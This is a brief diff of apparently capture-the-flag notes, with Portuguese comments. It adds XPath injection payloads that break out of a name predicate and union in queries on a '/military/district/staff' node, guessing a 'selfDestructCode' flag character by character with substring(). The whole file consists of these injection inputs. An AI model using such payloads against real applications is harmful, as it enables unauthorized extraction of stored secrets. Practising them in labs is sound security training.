@@ -1,4 +1,8 @@
-/x[name='']|/military/district/staff[substring(selfDestructCode,1,2) = 'CT']|/x[name='']
+# Testa o XPath Injection 
+/x[name='']|/military/district/staff[name='Straorg']
+
+# Testa se as 5 primeiras letras são 'CHTB{' (de 'CHTB{senha}')
+/x[name='']|/military/district/staff[substring(selfDestructCode,1,5) = 'CHTB{']|/x[name='']
 
 /x[name='']|/military/district/staff[selfDestructCode]|/x[name='']
 
